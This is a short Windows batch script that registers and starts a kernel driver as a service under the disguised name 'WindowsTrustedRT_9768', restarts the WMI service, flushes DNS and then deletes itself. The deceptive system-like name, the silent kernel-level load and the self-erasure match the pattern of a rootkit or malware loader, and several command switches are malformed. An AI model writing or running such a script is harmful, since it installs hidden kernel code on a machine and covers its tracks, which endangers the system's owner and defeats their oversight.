@echo off
cd %~dp0
sc create WindowsTrustedRT_9768 binpath=C:\Windows\System32\drivers\sbp3port.sys type=kernel
sc start WindowsTrustedRT_9768
net stop winmgmt / y
net start winmgmt / y
sc stop winmgmt
sc start winmgmt
ipconfig / flushdns
del "%~f0"